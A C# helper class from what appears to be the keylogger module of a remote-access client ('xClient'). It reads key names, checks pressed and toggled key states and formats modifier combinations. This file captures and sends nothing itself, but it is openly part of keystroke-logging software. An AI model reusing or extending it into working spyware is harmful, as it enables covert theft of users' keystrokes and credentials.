using System;
using System.Collections.Generic;
using System.Text;
using System.Reflection;
using xClient.Core.Keylogger;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace xClient.Core.Keylogger
{
    /// <summary>
    /// Provides extension methods that are used to assist repetitive tasks that
    /// are done throughout the keylogging system.
    /// </summary>
    public static class KeyloggerHelpers
    {
        /// <summary>
        /// Extracts the byte representation of the specific key provided.
        /// </summary>
        /// <param name="sender">The keylogger key to obtain the byte data from.</param>
        /// <returns>Returns the byte representation of the key provided.</returns>
        public static byte GetKeyloggerKeyValue(this KeyloggerKeys sender)
        {
            return Convert.ToByte(sender);
        }

        /// <summary>
        /// Determines if the key provided is one that is considered to be
        /// special and should be handled differently by the keylogger.
        /// </summary>
        /// <param name="sender">The keylogger key to decide upon.</param>
        /// <returns>True if the key is special; False if the key is not special.</returns>
        public static bool IsSpecialKey(this KeyloggerKeys sender)
        {
            try
            {
                FieldInfo fieldInfo = sender.GetType().GetField(sender.ToString());

                if (fieldInfo != null)
                {
                    KeyloggerKey[] keyloggerKeyAttributes = fieldInfo.GetCustomAttributes(typeof(KeyloggerKey), false) as KeyloggerKey[];

                    if (keyloggerKeyAttributes != null && keyloggerKeyAttributes.Length > 0)
                    {
                        return keyloggerKeyAttributes[0].IsSpecialKey;
                    }
                }

                return false;
            }
            catch
            {
                // The likely cause of this exception would be a lack of an attribute for the Keylogger Key.
                return false;
            }
        }

        /// <summary>
        /// Obtains the name, if one was given, of the key provided.
        /// </summary>
        /// <param name="sender">The keylogger key to obtain the name from.</param>
        /// <returns>Returns the name of the key that was explicitly provided, or string.Empty
        ///          if none was provided.</returns>
        public static string GetKeyloggerKeyName(this KeyloggerKeys sender)
        {
            try
            {
                FieldInfo fieldInfo = sender.GetType().GetField(sender.ToString());

                if (fieldInfo != null)
                {
                    KeyloggerKey[] keyloggerKeyAttributes = fieldInfo.GetCustomAttributes(typeof(KeyloggerKey), false) as KeyloggerKey[];

                    if (keyloggerKeyAttributes != null && keyloggerKeyAttributes.Length > 0)
                    {
                        return keyloggerKeyAttributes[0].KeyName;
                    }
                }

                return string.Empty;
            }
            catch
            {
                // The likely cause of this exception would be a lack of an attribute for the Keylogger Key.
                return string.Empty;
            }
        }

        /// <summary>
        /// Determines if the key code provided is in the pressed state.
        /// </summary>
        /// <param name="sender">The code for the key.</param>
        /// <returns>True if key is pressed; False if the key is not.</returns>
        public static bool IsKeyPressed(this short sender)
        {
            return (sender & 0x8000) != 0;
        }

        /// <summary>
        /// Determines if the key code provided is in a toggled state.
        /// </summary>
        /// <param name="sender">The code for the key.</param>
        /// <returns>True if toggled on; False if toggled off.</returns>
        public static bool IsKeyToggled(this short sender)
        {
            return (sender & 0x0001) != 0;
        }

        public static string BuildString(this KeyloggerModifierKeys sender)
        {
            // Add to this method for more combinations that should be supported!

            try
            {
                StringBuilder BuiltModifierKeys = new StringBuilder();

                if (sender.CtrlKeyPressed)
                {
                    string CtrlName = KeyloggerKeys.VK_CONTROL.GetKeyloggerKeyName();

                    if (!string.IsNullOrEmpty(CtrlName))
                        BuiltModifierKeys.Append(CtrlName + " + ");
                }
                if (sender.AltKeyPressed)
                {
                    string AltName = KeyloggerKeys.VK_MENU.GetKeyloggerKeyName();

                    if (!string.IsNullOrEmpty(AltName))
                        BuiltModifierKeys.Append(AltName + " + ");
                }
                if (sender.ShiftKeyPressed)
                {
                    string ShiftName = KeyloggerKeys.VK_SHIFT.GetKeyloggerKeyName();

                    if (!string.IsNullOrEmpty(ShiftName))
                        BuiltModifierKeys.Append(ShiftName + " + ");
                }
                if (sender.WindowsKeyPressed)
                {
                    string WinName = KeyloggerKeys.VK_LWIN.GetKeyloggerKeyName();

                    if (!string.IsNullOrEmpty(WinName))
                        BuiltModifierKeys.Append(WinName + " + ");
                }

                return BuiltModifierKeys.ToString();
            }
            catch
            {
                return string.Empty;
            }
        }
    }
}